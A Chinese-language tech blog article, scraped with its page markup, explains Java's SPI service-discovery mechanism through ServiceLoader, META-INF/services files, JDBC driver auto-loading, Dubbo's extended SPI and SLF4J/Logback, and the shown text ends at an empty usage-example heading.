                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Java SPI机制：从原理到实战</h2>
<h2 data-id="heading-1">一、什么是SPI机制</h2>
<p>SPI（Service Provider Interface），服务提供者接口，是Java提供的一种服务发现机制。它允许第三方服务提供商为核心库或接口提供实现，而不需要修改核心代码。</p>
<h3 data-id="heading-2">1.1 为什么需要SPI？</h3>
<p>在实际开发中，我们经常遇到这样的场景：定义了一个接口，但具体实现由不同厂商或不同场景提供。例如：</p>
<ul>
<li><strong>JDBC驱动</strong>：不同数据库（MySQL、Oracle、PostgreSQL）提供不同的驱动实现</li>
<li><strong>日志框架</strong>：SLF4J定义接口，Logback、Log4j2提供实现</li>
</ul>
<p>传统做法是通过硬编码或配置文件指定实现类，这样存在以下问题：</p>
<ul>
<li>代码耦合度高，切换实现需要修改代码</li>
<li>无法动态扩展</li>
<li>不符合"开闭原则"</li>
</ul>
<p>SPI机制通过约定配置文件的方式，实现了服务的动态发现和加载。</p>
<h3 data-id="heading-3">1.2 SPI vs API</h3>






























<table><thead><tr><th>特性</th><th>API（Application Programming Interface）</th><th>SPI（Service Provider Interface）</th></tr></thead><tbody><tr><td>调用方向</td><td>应用 → 框架/库</td><td>框架/库 → 服务提供者</td></tr><tr><td>定义者</td><td>框架/库定义</td><td>框架/库定义</td></tr><tr><td>实现者</td><td>应用实现</td><td>第三方提供者实现</td></tr><tr><td>使用场景</td><td>应用使用框架功能</td><td>框架调用扩展实现</td></tr></tbody></table>
<p>简单理解：<strong>API是给应用用的，SPI是给框架扩展用的。</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/000af4c89a2549ab8b83413a24d2aed9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770254152&amp;x-signature=nqnUqV981Eyrc%2FDxAqLEm93fqdI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">二、Java SPI核心原理</h2>
<h3 data-id="heading-5">2.1 核心类</h3>
<p>Java SPI主要依赖<code>java.util.ServiceLoader</code>类，位于JDK核心库中。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServiceLoader</span>&lt;<span class="hljs-title class_">S</span>&gt; <span class="hljs-title class_">implements</span> <span class="hljs-title class_">Iterable</span>&lt;<span class="hljs-title class_">S</span>&gt; {
    <span class="hljs-comment">// 服务接口的Class对象</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span>&lt;<span class="hljs-type">S</span>&gt; service;

    <span class="hljs-comment">// 类加载器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ClassLoader</span> loader;

    <span class="hljs-comment">// 已加载的服务提供者缓存</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">LinkedHashMap</span>&lt;<span class="hljs-type">String</span>,<span class="hljs-type">S</span>&gt; providers <span class="hljs-operator">=</span> new <span class="hljs-type">LinkedHashMap</span>&lt;&gt;();

    <span class="hljs-comment">// 懒加载查找迭代器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">LazyIterator</span> lookupIterator;

    <span class="hljs-comment">// 通过类加载器和接口类型加载服务</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-operator">&lt;</span><span class="hljs-type">S</span><span class="hljs-operator">&gt;</span> <span class="hljs-type">ServiceLoader</span>&lt;<span class="hljs-type">S</span>&gt; load(<span class="hljs-type">Class</span>&lt;<span class="hljs-type">S</span>&gt; service) {
        <span class="hljs-type">ClassLoader</span> cl <span class="hljs-operator">=</span> <span class="hljs-type">Thread</span>.currentThread().getContextClassLoader();
        <span class="hljs-keyword">return</span> <span class="hljs-type">ServiceLoader</span>.load(service, cl);
    }

    <span class="hljs-comment">// 通过指定类加载器加载服务</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-operator">&lt;</span><span class="hljs-type">S</span><span class="hljs-operator">&gt;</span> <span class="hljs-type">ServiceLoader</span>&lt;<span class="hljs-type">S</span>&gt; load(<span class="hljs-type">Class</span>&lt;<span class="hljs-type">S</span>&gt; service, <span class="hljs-type">ClassLoader</span> loader) {
        <span class="hljs-keyword">return</span> new <span class="hljs-type">ServiceLoader</span>&lt;&gt;(service, loader);
    }
}
</code></pre>
<h3 data-id="heading-6">2.2 约定配置文件</h3>
<p>SPI机制通过约定配置文件来发现服务实现。配置文件位置必须为：</p>
<pre><code class="hljs language-bash" lang="bash">META-INF/services/
└── com.example.spi.SomeService  <span class="hljs-comment"># 文件名为接口的全限定名</span>
</code></pre>
<p>文件内容为实现类的全限定名，每行一个：</p>
<pre><code class="hljs language-rust" lang="rust">com.example.spi.<span class="hljs-keyword">impl</span>.SomeServiceImpl
com.example.spi.<span class="hljs-keyword">impl</span>.AnotherServiceImpl
</code></pre>
<h3 data-id="heading-7">2.3 服务加载流程</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c29e3110cda049fa93ef8d6f73b14d3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770254152&amp;x-signature=aq7j06Y1xtYG00%2F8HbS4V8sKI8A%3D" alt="" loading="lazy"/></p>
<p>服务加载流程如下：</p>
<ol>
<li><strong>查找配置文件</strong>：ServiceLoader在classpath下查找<code>META-INF/services/接口全限定名</code>文件</li>
<li><strong>解析配置文件</strong>：读取文件内容，获取所有实现类的全限定名</li>
<li><strong>类加载</strong>：使用类加载器加载实现类</li>
<li><strong>实例化</strong>：通过反射创建实现类实例</li>
<li><strong>类型转换</strong>：将实例转换为接口类型</li>
<li><strong>缓存结果</strong>：将实例缓存到providers Map中</li>
</ol>
<h2 data-id="heading-8">三、Java SPI使用示例</h2>
<p>让我们通过一个完整的示例来演示Java SPI的使用。</p>
<h3 data-id="heading-9">3.1 定义接口</h3>
<p>首先定义一个数据库操作接口：</p>
<pre><code class="hljs language-arduino" lang="arduino">package com.example.spi;

<span class="hljs-comment">/**
 * 数据库操作接口
 */</span>
<span class="hljs-keyword">public</span> interface DatabaseOperation {

    <span class="hljs-comment">/**
     * 执行查询
     * @param sql SQL语句
     * @return 查询结果
     */</span>
    <span class="hljs-function"><span class="hljs-type">String</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">String</span> sql)</span></span>;

    <span class="hljs-comment">/**
     * 获取数据库类型
     * @return 数据库类型名称
     */</span>
    <span class="hljs-function"><span class="hljs-type">String</span> <span class="hljs-title">getDatabaseType</span><span class="hljs-params">()</span></span>;

    <span class="hljs-comment">/**
     * 获取版本信息
     * @return 版本号
     */</span>
    <span class="hljs-function"><span class="hljs-type">String</span> <span class="hljs-title">getVersion</span><span class="hljs-params">()</span></span>;
}
</code></pre>
<h3 data-id="heading-10">3.2 实现MySQL操作</h3>
<pre><code class="hljs language-typescript" lang="typescript">package com.<span class="hljs-property">example</span>.<span class="hljs-property">spi</span>.<span class="hljs-property">impl</span>;

<span class="hljs-keyword">import</span> com.<span class="hljs-property">example</span>.<span class="hljs-property">spi</span>.<span class="hljs-property">DatabaseOperation</span>;

<span class="hljs-comment">/**
 * MySQL数据库操作实现
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySQLDatabaseOperation</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DatabaseOperation</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">query</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> sql</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"[MySQL] 执行SQL: "</span> + sql);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"MySQL查询结果集"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getDatabaseType</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"MySQL"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getVersion</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"8.0.32"</span>;
    }
}
</code></pre>
<h3 data-id="heading-11">3.3 实现Oracle操作</h3>
<pre><code class="hljs language-typescript" lang="typescript">package com.<span class="hljs-property">example</span>.<span class="hljs-property">spi</span>.<span class="hljs-property">impl</span>;

<span class="hljs-keyword">import</span> com.<span class="hljs-property">example</span>.<span class="hljs-property">spi</span>.<span class="hljs-property">DatabaseOperation</span>;

<span class="hljs-comment">/**
 * Oracle数据库操作实现
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OracleDatabaseOperation</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">DatabaseOperation</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">query</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> sql</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"[Oracle] 执行SQL: "</span> + sql);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Oracle查询结果集"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getDatabaseType</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Oracle"</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getVersion</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"19c"</span>;
    }
}
</code></pre>
<h3 data-id="heading-12">3.4 配置SPI文件</h3>
<p>在<code>src/main/resources/META-INF/services/</code>目录下创建配置文件：</p>
<p><strong>文件名</strong>：<code>com.example.spi.DatabaseOperation</code></p>
<p><strong>文件内容</strong>：</p>
<pre><code class="hljs language-rust" lang="rust">com.example.spi.<span class="hljs-keyword">impl</span>.MySQLDatabaseOperation
com.example.spi.<span class="hljs-keyword">impl</span>.OracleDatabaseOperation
</code></pre>
<h3 data-id="heading-13">3.5 使用ServiceLoader加载服务</h3>
<pre><code class="hljs language-csharp" lang="csharp">package com.example.spi;

import java.util.ServiceLoader;

<span class="hljs-comment">/**
 * SPI服务加载器
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">SPIDemo</span> {

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"=== Java SPI 机制演示 ===\n"</span>);

        <span class="hljs-comment">// 加载所有DatabaseOperation实现</span>
        ServiceLoader&lt;DatabaseOperation&gt; loader = ServiceLoader.load(DatabaseOperation.<span class="hljs-keyword">class</span>);

        <span class="hljs-comment">// 遍历所有实现</span>
        <span class="hljs-keyword">for</span> (DatabaseOperation operation : loader) {
            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"发现数据库实现: "</span> + operation.getClass().getSimpleName());
            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"数据库类型: "</span> + operation.getDatabaseType());
            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"版本信息: "</span> + operation.getVersion());
            String result = operation.query(<span class="hljs-string">"SELECT * FROM users"</span>);
            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"查询结果: "</span> + result);
            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"----------------------"</span>);
        }

        <span class="hljs-comment">// 再次遍历，验证缓存机制</span>
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"\n=== 第二次遍历（从缓存读取）==="</span>);
        <span class="hljs-keyword">for</span> (DatabaseOperation operation : loader) {
            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"缓存中的实现: "</span> + operation.getClass().getSimpleName());
        }
    }
}
</code></pre>
<h2 data-id="heading-14">四、SPI在JDBC驱动中的应用</h2>
<p>JDBC是Java SPI机制的典型应用场景。让我们深入分析JDBC如何通过SPI加载驱动。</p>
<h3 data-id="heading-15">4.1 传统驱动加载方式</h3>
<p>在JDBC 4.0之前，需要显式加载驱动：</p>
<pre><code class="hljs language-ini" lang="ini">// 显式加载驱动
Class.forName("com.mysql.cj.jdbc.Driver")<span class="hljs-comment">;</span>
Connection <span class="hljs-attr">conn</span> = DriverManager.getConnection(url, user, password)<span class="hljs-comment">;</span>
</code></pre>
<p>这种方式存在以下问题：</p>
<ul>
<li>需要硬编码驱动类名</li>
<li>代码与具体驱动耦合</li>
<li>切换数据库需要修改代码</li>
</ul>
<h3 data-id="heading-16">4.2 SPI自动加载机制</h3>
<p>从JDBC 4.0开始，通过SPI机制自动发现并加载驱动。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac4a68a5d22e4dccba12d2fff32792a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770254152&amp;x-signature=ntb3SvjBTPDto32qZJ7Ut4TuqZU%3D" alt="" loading="lazy"/></p>
<p><strong>驱动注册流程</strong>：</p>
<ol>
<li>MySQL驱动jar包中的SPI配置文件</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">文件路径：META-INF/services/java.sql.Driver
com.mysql.cj.jdbc.Driver

 
</code></pre>
<ol>
<li>当DriverManager类被加载时，会触发静态初始化块：</li>
</ol>
<pre><code class="hljs language-scss" lang="scss"> public class DriverManager {
 static {
        <span class="hljs-built_in">loadInitialDrivers</span>();
        <span class="hljs-built_in">println</span>("JDBC DriverManager initialized");
    }

 private static void <span class="hljs-built_in">loadInitialDrivers</span>() {
        ServiceLoader&lt;Driver&gt; loadedDrivers = ServiceLoader<span class="hljs-selector-class">.load</span>(Driver.class);
        Iterator&lt;Driver&gt; driversIterator = loadedDrivers<span class="hljs-selector-class">.iterator</span>();

 try {
 <span class="hljs-built_in">while</span>(driversIterator.hasNext()) {
                driversIterator<span class="hljs-selector-class">.next</span>();
            }
        } <span class="hljs-built_in">catch</span>(Throwable t) {
 <span class="hljs-comment">// 处理异常</span>
        }
    }
}

 
</code></pre>
<ol>
<li>MySQL驱动实现类的静态初始化块会注册驱动：</li>
</ol>

<pre><code class="hljs language-scala" lang="scala"><span class="hljs-keyword">package</span> com.mysql.cj.jdbc;

public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Driver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">NonRegisteringDriver</span> <span class="hljs-title">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">sql</span>.<span class="hljs-title">Driver</span> </span>{
 static {
 <span class="hljs-keyword">try</span> {
            java.sql.<span class="hljs-type">DriverManager</span>.registerDriver(<span class="hljs-keyword">new</span> <span class="hljs-type">Driver</span>());
        } <span class="hljs-keyword">catch</span> (<span class="hljs-type">SQLException</span> <span class="hljs-type">E</span>) {
 <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">RuntimeException</span>(<span class="hljs-string">"Can't register driver!"</span>);
        }
    }

}
</code></pre>
<h3 data-id="heading-17">4.3 使用示例</h3>
<p>使用SPI机制后，获取数据库连接变得非常简单：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.jdbc;

<span class="hljs-keyword">import</span> java.sql.Connection;
<span class="hljs-keyword">import</span> java.sql.DriverManager;
<span class="hljs-keyword">import</span> java.sql.PreparedStatement;
<span class="hljs-keyword">import</span> java.sql.ResultSet;

<span class="hljs-comment">/**
 * JDBC SPI使用示例
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcSPIDemo</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 无需显式加载驱动，SPI自动发现</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-string">"root"</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">"password"</span>;

        <span class="hljs-keyword">try</span> (<span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DriverManager.getConnection(url, user, password)) {
            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT id, username, email FROM users WHERE status = ?"</span>;

            <span class="hljs-keyword">try</span> (<span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql)) {
                pstmt.setInt(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);

                <span class="hljs-keyword">try</span> (<span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> pstmt.executeQuery()) {
                    <span class="hljs-keyword">while</span> (rs.next()) {
                        System.out.println(<span class="hljs-string">"ID: "</span> + rs.getInt(<span class="hljs-string">"id"</span>));
                        System.out.println(<span class="hljs-string">"用户名: "</span> + rs.getString(<span class="hljs-string">"username"</span>));
                        System.out.println(<span class="hljs-string">"邮箱: "</span> + rs.getString(<span class="hljs-string">"email"</span>));
                    }
                }
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-18">4.4 实际生产案例</h3>
<p><strong>场景</strong>：支持多数据源动态切换</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.jdbc;

<span class="hljs-keyword">import</span> javax.sql.DataSource;
<span class="hljs-keyword">import</span> java.sql.Connection;
<span class="hljs-keyword">import</span> java.sql.SQLException;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.ServiceLoader;

<span class="hljs-comment">/**
 * 多数据源管理器
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiDataSourceManager</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, DataSource&gt; dataSourceMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MultiDataSourceManager</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 通过SPI加载所有DataSource实现</span>
        ServiceLoader&lt;DataSourceProvider&gt; providers =
            ServiceLoader.load(DataSourceProvider.class);

        <span class="hljs-keyword">for</span> (DataSourceProvider provider : providers) {
            <span class="hljs-type">DataSource</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> provider.createDataSource();
            dataSourceMap.put(provider.getDataSourceName(), ds);
            System.out.println(<span class="hljs-string">"注册数据源: "</span> + provider.getDataSourceName());
        }
    }

    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dataSourceName)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-type">DataSource</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> dataSourceMap.get(dataSourceName);
        <span class="hljs-keyword">if</span> (ds == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"未找到数据源: "</span> + dataSourceName);
        }
        <span class="hljs-keyword">return</span> ds.getConnection();
    }

    <span class="hljs-comment">/**
     * 动态切换数据源执行查询
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executeQuery</span><span class="hljs-params">(String dataSourceName, String sql)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> getConnection(dataSourceName)) {
            <span class="hljs-keyword">try</span> (<span class="hljs-type">var</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();
                 <span class="hljs-type">var</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql)) {

                System.out.println(<span class="hljs-string">"["</span> + dataSourceName + <span class="hljs-string">"] 查询结果:"</span>);
                <span class="hljs-keyword">while</span> (rs.next()) {
                    <span class="hljs-comment">// 处理结果集</span>
                }
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-19">五、Dubbo对SPI的改进</h2>
<p>虽然Java SPI提供了服务发现机制，但存在一些不足：</p>
<ol>
<li><strong>无法按需加载</strong>：一次性加载所有实现，浪费资源</li>
<li><strong>缺少配置化</strong>：无法通过配置选择具体实现</li>
<li><strong>缺少依赖注入</strong>：实现类之间无法相互依赖</li>
<li><strong>缺少扩展点隔离</strong>：不同扩展点的实现可能冲突</li>
</ol>
<p>Dubbo实现了自己的SPI机制，解决了这些问题。</p>
<h3 data-id="heading-20">5.1 Dubbo SPI改进</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de6a6c1833794f19bd8c7157c02b2367~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770254152&amp;x-signature=vwyUBEHQrdpnT8u%2FpFcen6coxRA%3D" alt="" loading="lazy"/></p>
<p><strong>主要改进</strong>：</p>
<ol>
<li><strong>支持按需加载</strong>：只加载需要的实现</li>
<li><strong>支持依赖注入</strong>：实现类可以注入其他扩展点</li>
<li><strong>支持自适应扩展</strong>：根据运行时参数自动选择实现</li>
<li><strong>支持AOP</strong>：可以为扩展点添加包装类</li>
</ol>
<h3 data-id="heading-21">5.2 Dubbo SPI示例</h3>
<pre><code class="hljs language-ini" lang="ini">package com.example.dubbo.spi<span class="hljs-comment">;</span>

import org.apache.dubbo.common.extension.ExtensionLoader<span class="hljs-comment">;</span>

/**
 * Dubbo SPI使用示例
 */
public class DubboSPIDemo {

    public static void main(String<span class="hljs-section">[]</span> args) {
        // 获取扩展加载器
        ExtensionLoader&lt;Robot&gt; <span class="hljs-attr">loader</span> = ExtensionLoader.getExtensionLoader(Robot.class)<span class="hljs-comment">;</span>

        // 按需获取指定实现
        Robot <span class="hljs-attr">optimusPrime</span> = loader.getExtension(<span class="hljs-string">"optimusPrime"</span>)<span class="hljs-comment">;</span>
        optimusPrime.sayHello()<span class="hljs-comment">;</span>

        Robot <span class="hljs-attr">bumblebee</span> = loader.getExtension(<span class="hljs-string">"bumblebee"</span>)<span class="hljs-comment">;</span>
        bumblebee.sayHello()<span class="hljs-comment">;</span>

        // 获取自适应扩展（根据URL参数自动选择）
        Robot <span class="hljs-attr">adaptiveRobot</span> = loader.getAdaptiveExtension()<span class="hljs-comment">;</span>
        adaptiveRobot.sayHello()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h2 data-id="heading-22">六、实际生产案例：日志框架SPI</h2>
<h3 data-id="heading-23">6.1 SLF4J + Logback实现</h3>
<p>SLF4J定义日志门面接口，Logback提供实现。</p>
<p><strong>SLF4J接口</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">package org.slf4j;

<span class="hljs-keyword">public</span> interface Logger {
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">debug</span><span class="hljs-params">(<span class="hljs-type">String</span> msg)</span></span>;
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">info</span><span class="hljs-params">(<span class="hljs-type">String</span> msg)</span></span>;
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">warn</span><span class="hljs-params">(<span class="hljs-type">String</span> msg)</span></span>;
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">error</span><span class="hljs-params">(<span class="hljs-type">String</span> msg)</span></span>;
}
</code></pre>
<p><strong>Logback实现</strong>：</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">META-INF/services/org.slf4j.spi.SLF4JServiceProvider</span>
ch.qos.logback.classic.spi.LogbackServiceProvider
</code></pre>
<p><strong>使用示例</strong>：</p>
